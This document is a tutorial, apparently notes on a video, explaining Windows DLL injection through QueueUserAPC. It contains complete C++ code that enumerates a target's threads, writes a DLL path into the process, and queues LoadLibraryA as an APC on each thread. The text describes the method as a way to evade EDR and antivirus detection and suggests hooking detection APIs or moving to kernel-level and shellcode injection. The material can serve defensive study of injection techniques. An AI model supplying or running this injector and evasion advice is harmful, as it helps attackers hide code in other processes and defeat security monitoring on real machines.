https://www.youtube.com/watch?v=RBCR9Gvp5BM

**Context:**  
DLL injection is a technique for forcing a target process to load and execute code from a DLL that it normally wouldn’t. One common approach uses `CreateRemoteThread` to run `LoadLibrary` inside the target process. However, `CreateRemoteThread` is easily detectable by kernel drivers or security tools due to the creation of a new thread. An alternative, stealthier method is to use `QueueUserAPC` to inject your DLL.

---
## Overview of `QueueUserAPC` Injection

- **Goal:** Inject a DLL into a target process without explicitly creating a remote thread.
- **Key Idea:**  
  An APC (Asynchronous Procedure Call) can be queued to an existing thread in the target process. When that thread enters an alertable wait state (e.g., `MsgWaitForMultipleObjectsEx` with `MWMO_ALERTABLE`), the queued APC will run in that thread’s context.
- **Difference from `CreateRemoteThread` Method:**
  - `CreateRemoteThread`: Immediately creates a new thread in the target process. Very direct but easily detected.
  - `QueueUserAPC`: Attaches a function call (like `LoadLibraryA`) to an existing thread. No new thread is created, making it subtler.  
    However, it relies on the target thread eventually becoming alertable. If none of the target’s threads enter an alertable wait, the APC may never execute.

---
## High-Level Steps
1. **Identify the Target Process:**
   - Obtain the process ID (PID) of the process you wish to inject into.
2. **Write the DLL Path into the Target Process:**
   - Allocate memory in the target process via `VirtualAllocEx`.
   - Write the full path of the DLL into that allocated memory using `WriteProcessMemory`.
3. **Get the Address of `LoadLibraryA`:**
   - Use `GetModuleHandle("kernel32.dll")` and `GetProcAddress` to find `LoadLibraryA`.
   - This address is used as the APC routine.
4. **Enumerate Threads of the Target Process:**
   - Use `CreateToolhelp32Snapshot` and `Thread32First`/`Thread32Next` to list all threads in the system, filter by the target PID.
5. **Queue the APC into Each Thread:**
   - For each thread in the target process, open it with `OpenThread(THREAD_SET_CONTEXT, ...)`.
   - Call `QueueUserAPC` with `LoadLibraryA` as the APC function and the allocated DLL path as the parameter.
6. **Wait and Hope for Alertable State:**
   - Eventually, if a thread calls a function like `SleepEx` or `MsgWaitForMultipleObjectsEx` in alertable mode, the APC runs.
   - `LoadLibraryA` executes in the target thread, loading your DLL.

---
## Considerations and Limitations
- **Reliance on Alertable Waits:**
  - The APC will not execute unless the thread enters an alertable wait.
  - You might queue APCs to all threads to maximize the chance that at least one thread eventually performs an alertable wait.
- **Stealth:**
  - This method doesn’t create a new remote thread, making it less suspicious to certain security tools.
- **64-bit vs. 32-bit:**
  - Ensure bitness alignment: a 64-bit target cannot load a 32-bit DLL, and vice versa.

---
## Example Code

**Setup:**
- We have a target process ID: `pid`.
- We have a DLL path: `C:\Path\To\MyInjected.dll`.
- We have included `<windows.h>`, `<tlhelp32.h>`, `<vector>`, `<iostream>`.

### Enumerating Threads of a Process

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>
#include <string>

std::vector<DWORD> EnumThreads(DWORD pid) {
    std::vector<DWORD> tids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return tids; // empty
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tids.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tids;
}
```

### Finding `LoadLibraryA` Address

```cpp
LPVOID GetLoadLibraryAddress() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return NULL;
    return (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
}
```

### Injecting the DLL via `QueueUserAPC`

```cpp
int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: APCInjector.exe <PID> <DLLPath>\n";
        return 1;
    }

    DWORD pid = std::stoul(argv[1]);
    std::string dllPath = argv[2];

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Failed to open process\n";
        return 1;
    }

    // Allocate memory in target process
    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPath.size() + 1, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteDllPath) {
        std::cerr << "VirtualAllocEx failed\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Write DLL path to target
    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath.c_str(), dllPath.size() + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed\n";
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get LoadLibraryA address
    LPVOID pLoadLibraryA = GetLoadLibraryAddress();
    if (!pLoadLibraryA) {
        std::cerr << "GetLoadLibraryAddress failed\n";
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Enumerate target threads
    std::vector<DWORD> threads = EnumThreads(pid);
    if (threads.empty()) {
        std::cerr << "No threads found in target process\n";
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Queue APC to each thread
    for (auto tid : threads) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (hThread) {
            if (QueueUserAPC((PAPCFUNC)pLoadLibraryA, hThread, (ULONG_PTR)remoteDllPath)) {
                std::cout << "APC queued to thread " << tid << "\n";
            } else {
                std::cerr << "QueueUserAPC failed on thread " << tid << "\n";
            }
            CloseHandle(hThread);
        } else {
            std::cerr << "OpenThread failed for TID " << tid << "\n";
        }
    }

    // No direct wait or confirmation here. We rely on the target thread eventually entering alertable wait.
    CloseHandle(hProcess);
    return 0;
}
```

### Testing the Injection

1. Start a target process (e.g., `notepad.exe` or `explorer.exe`).
2. Identify the PID using Task Manager or `tasklist`.
3. Run:
   ```cmd
   APCInjector.exe 1234 C:\Path\To\MyInjected.dll
   ```
4. In Process Explorer, examine the target process’s DLL list. Eventually, your DLL should appear once a thread goes into an alertable wait state.

---

## Additional Notes

- **Forcing Alertable State:**  
  Not covered here, but some advanced techniques exist. Generally, you rely on the target’s natural behavior (UI threads often do alertable waits when calling APIs like `MsgWaitForMultipleObjectsEx` with `MWMO_ALERTABLE`).

- **Stealth Considerations:**  
  `QueueUserAPC` is subtler than `CreateRemoteThread` but still detectable by certain EDR/AV solutions. Consider hooking or detouring detection APIs or exploring even more subtle injection methods (like APC injection at kernel level or direct shellcode injection through `NtQueueApcThread` etc.).

- **Cleaning Up:**  
  Typically no cleanup required. Once `LoadLibraryA` is called, the DLL is loaded into the target. If you need to unload, you can similarly queue an APC to call `FreeLibrary`.

---

## Summary

- **What We Achieved:**
  - Injected a DLL without creating a new remote thread.
  - Used `QueueUserAPC` to schedule code (LoadLibrary) on existing target threads.
  - Relied on threads entering an alertable wait to execute our injected code.

- **Why Use This Method:**
  - Potentially less conspicuous than `CreateRemoteThread`.
  - Useful for evading some detection mechanisms.

This technique is a well-known but more subtle form of user-mode injection that trades certainty (immediate thread creation) for stealth (APC execution at a later, less obvious point in time).
```